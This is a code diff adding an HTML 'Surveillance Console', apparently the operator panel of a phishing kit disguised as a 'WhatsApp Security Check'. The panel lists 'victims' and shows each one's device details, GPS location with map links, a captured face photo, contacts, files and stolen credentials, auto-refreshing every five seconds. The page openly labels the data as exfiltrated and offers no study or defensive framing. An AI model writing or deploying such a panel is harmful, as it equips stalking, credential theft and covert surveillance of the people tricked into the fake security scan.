@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surveillance Console</title>
+    <style>
+        body { background: #0a1014; color: #e9edef; font-family: 'SF Mono', 'Courier New', monospace; padding: 20px; }
+        h2 { color: #00a884; }
+        .stats { background: #1f2c34; border-radius: 12px; padding: 16px; margin-bottom: 20px; display: flex; gap: 20px; flex-wrap: wrap; }
+        button { background: #00a884; color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: bold; cursor: pointer; margin-right: 10px; }
+        .card { background: #1f2c34; border-radius: 12px; padding: 16px; margin-bottom: 20px; border-left: 6px solid #00a884; }
+        .label { color: #8696a0; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .value { font-size: 18px; font-weight: 600; margin: 4px 0 12px; word-break: break-all; }
+        .photo-thumb { max-width: 200px; border-radius: 8px; border: 1px solid #2a373f; }
+        .map-link { color: #00a884; text-decoration: none; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    </style>
+</head>
+<body>
+    <h2>🕵️ WhatsApp Security Check – Exfiltrated Data</h2>
+    <div class="stats">
+        <button onclick="loadData()">🔄 Refresh</button>
+        <button onclick="clearData()">🗑️ Clear All</button>
+        <span style="margin-left:20px;">Victims: <span id="victimCount">0</span></span>
+    </div>
+    <div id="container"></div>
+
+    <script>
+        function loadData() {
+            const data = localStorage.getItem('waVictims');
+            const container = document.getElementById('container');
+            if (!data) {
+                container.innerHTML = '<div class="card">No victims yet. Victim must complete the security scan.</div>';
+                document.getElementById('victimCount').textContent = '0';
+                return;
+            }
+            const victims = JSON.parse(data);
+            document.getElementById('victimCount').textContent = victims.length;
+            
+            let html = '';
+            victims.slice().reverse().forEach((v, idx) => {
+                html += `<div class="card">`;
+                html += `<div class="label">🕒 ${v.timestamp}</div>`;
+                html += `<div class="grid-2">`;
+                html += `<div><span class="label">Device</span><div class="value">${v.platform}<br>${v.screen}<br>Battery: ${v.battery}</div></div>`;
+                html += `<div><span class="label">Network</span><div class="value">${v.network}<br>Lang: ${v.language}</div></div>`;
+                html += `</div>`;
+                
+                html += `<div class="label">📍 Location</div>`;
+                if (v.location && typeof v.location === 'object') {
+                    html += `<div class="value">${v.location.lat}, ${v.location.lng} <a class="map-link" href="https://maps.google.com/?q=${v.location.lat},${v.location.lng}" target="_blank">(Open Map)</a></div>`;
+                } else {
+                    html += `<div class="value">${v.location || 'Denied'}</div>`;
+                }
+
+                if (v.photo && v.photo.startsWith('data:image')) {
+                    html += `<div class="label">📸 Captured Photo</div>`;
+                    html += `<img class="photo-thumb" src="${v.photo}" alt="victim face">`;
+                } else {
+                    html += `<div class="label">📸 Photo</div><div class="value">${v.photo || 'Not captured'}</div>`;
+                }
+
+                html += `<div class="label">📇 Contacts (${v.contacts.length})</div>`;
+                html += `<div class="value">${v.contacts.slice(0,8).join(', ')}${v.contacts.length>8 ? '...' : ''}</div>`;
+
+                html += `<div class="label">📁 Files</div>`;
+                html += `<div class="value">${v.files.map(f => `• ${f}`).join('<br>')}</div>`;
+
+                html += `<div class="label">🔑 Credentials</div>`;
+                html += `<div class="value">${v.credentials.map(c => `• ${c}`).join('<br>')}</div>`;
+
+                html += `</div>`;
+            });
+            container.innerHTML = html;
+        }
+
+        function clearData() {
+            if (confirm('Permanently delete all captured data?')) {
+                localStorage.removeItem('waVictims');
+                loadData();
+            }
+        }
+
+        loadData();
+        setInterval(loadData, 5000);
+    </script>
+</body>
+</html>
